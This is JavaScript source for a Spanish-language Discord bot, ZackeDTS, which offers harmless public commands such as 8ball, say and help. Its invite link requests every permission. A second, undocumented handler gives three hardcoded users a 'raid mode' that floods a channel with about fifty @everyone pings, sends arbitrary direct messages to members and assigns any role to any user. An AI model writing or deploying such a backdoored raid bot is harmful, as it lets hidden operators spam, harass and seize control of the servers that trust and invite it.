const Discord = require("discord.js");
const client = new Discord.Client({ ws: { properties: { $browser: "Discord Android" }}})


client.on("ready", () => {
    console.log("Listo, váyalooooo :3");
	client.user.setActivity("God of War 2", {type: "PLAYING", presence:"DND"})
});

const prefix = ";;";
const raid = "!!";

let muteds = [];

client.on("message", message => {
    if(!message.guild || !message.content.startsWith(prefix)) return;
    if(message.author.bot) return;
    
    const cont = message.content.split(' ').slice(1);
    const args = cont.join(' '); 
	
	//sirve para mandar la invitación :v
	
	if(message.content.startsWith(prefix+"invite")) {
		message.channel.send(`¡Revisa tu MD, ${message.author}!`);
		message.author.send("https://discord.com/oauth2/authorize?client_id=ID-DEL-BOT&scope=bot&permissions=2147483647");
		message.author.send("¡Gracias por desear invitarme!");
	}
	if(message.content.startsWith(prefix+"8ball")) {
		if(!args[0]) return message.channel.send(`¡Falta tu pregunta, ${message.author}!`);
		let ball = ["Sí", "No", "Tal vez", "Obvio", "Yo digo que si", "Yo digo que no", "Probablemente", "._.xd", "¿Qué?", "Sigue soñando", "Baby Shark Doo Doo Doo Doo Doo..."]
		let randomball = ball[Math.floor(Math.random() * ball.length)]
		message.channel.send(randomball+`, ${message.author}`);
	}
	if(message.content.startsWith(prefix+"say")) {
		message.delete();
		const { Util } = require('discord.js');

		let args = message.content.slice(prefix.length).trim().split(/ +/g);

		if (!args) return message.reply(`No tengo nada que decir.`);

		let mensaje = args.join(" ");

		for(let i = 0; mensaje.includes("@here") || mensaje.includes("@everyone") || mensaje.includes("say"); i++){
			mensaje = mensaje.replace(/@here/g, "here");
			mensaje = mensaje.replace(/@everyone/g, "everyone");
			mensaje = mensaje.replace(/say/g, " ");
		}
		return message.channel.send(Util.cleanContent(mensaje, message)).catch(e => e);
	}
	if(message.content.startsWith(prefix+"help")) {
		message.channel.send("¡Revisa tu MD! | :ballot_box_with_check:")
		const help = new Discord.MessageEmbed()
		.setTitle("Comandos de ZackeDTS.")
		.setDescription("El prefix del bot es ``;;``")
		.setAuthor(message.author.username, message.author.avatarURL)
		.setColor("RANDOM")
		.setFooter("Pedido por: " + message.author.username)
		.setThumbnail(message.author.avatarURL)
		.setTimestamp()
		.addField("help", "Envía este embed de ayuda.")
		.addField("8ball", "Lanza una respuesta aleatoria a tu pregunta.")
		.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server.")
		.addField("say", "Comando divertido donde el bot dice lo que tú escribes.")
		.addField("Creador", "MaxC++#7997")
		message.author.send(help).catch(e => message.channel.send("Mensaje Directo Cerrado! | :x:"))  //esto es para que se envie al Privado de la persona que escribio el comando; en caso que tenga el Md desactivado le enviara 'usuario con Md desactivado'
	}
});

//Comandos especiales que solo pueden usar los usuarios definidos 

client.on("message", message =>{
	if(!message.content.startsWith(raid))return;
	if(message.author.bot) return;
	if(message.author.tag == ("MaxC++#7997") || message.author.tag == ("StunxFS#8549") || message.author.tag == ("Rub3n#1886")){
		if(message.content.startsWith(raid+"error0")){ //help
			message.delete();
			if(!message.content.includes("error0")) return;
			const help = new Discord.MessageEmbed()
			.setTitle("Comandos de ZackeDTS.")
			.setDescription("||*Modo Raid*|| - El prefix del bot es ``!!``")
			.setAuthor(message.author.username, message.author.avatarURL)
			.setColor("RANDOM")
			.setFooter("Pedido por: " + message.author.username)
			.setThumbnail(message.author.avatarURL)
			.setTimestamp()
			.addField("error0", "Envía este embed de ayuda")
			.addField("rape0", "envía 50 everyone en el canal donde se escriba")
			.addField("invite", "Te envía al MD un link para que puedas invitar a este bot a tu server. ")
			.addField("Creador", "MaxC++#7997")
			message.author.send(help).catch(e => message.channel.send("Error | :x:"))
		}
		//Envía 50 everyones en donde se envía este comando
		if(message.content.startsWith(raid+"rape0")) {
			message.delete();
			for(let every = 0; every<=50; every++){
				message.channel.send("@everyone");
			}
		}
		//envía el mensaje que quieras al usuario mencionado, siempre y cuando esté en el mismo server
		if(message.content.startsWith(raid+"case0")) {
			message.delete();
			let member = message.mentions.members.first();
			let args = message.content.slice(prefix.length).trim().split(/ +/g);
			let texto = args.join (" ");
			for(let x = 0; texto.includes("case0"); x++){
				texto = texto.replace(/case0/g, " ");
			}
			if (!!member.user) member.user.send(texto).catch(e => message.author.send("Error | :x:"));
		}
		//Este comando le asigna el rol definido a la persona definida
		if(message.content.startsWith(raid+"take")) {
			message.delete();
			let usuario = message.mentions.members.first();
			let rol = message.mentions.roles.first();

			if (!usuario) return message.author.send("Menciona a alguien.");

			if (!rol) return message.author.send("Menciona un rol");
			usuario.roles.add(rol).catch(e => message.author.send("Ha aparecido un error, lpm"));
			message.author.send(`Rol ${rol} agregado a ${usuario} correctamente!`).catch(e => message.author.send("Wacho, hubo un error x,d"));
		}
	}else return;
});

client.on("message", message => {
	if(!message.guild) return message.author.send("Lo siento, pero no estás en un servidor.");
	if(message.author.bot) return;
	
	if(message.content.startsWith("<@!ID_DEL_BOT>")) {
		message.channel.send("Prefix: "+prefix);
	}
	/*if(message.is("prueba")) {
		message.reply("funciona");
	}
	if(message.is("prueba1")) {
		message.reply("¿funciona?");
	}*/
	if(message.content.startsWith("ping")){
		message.reply("pong");
	}
});

client.login("Token del bot");
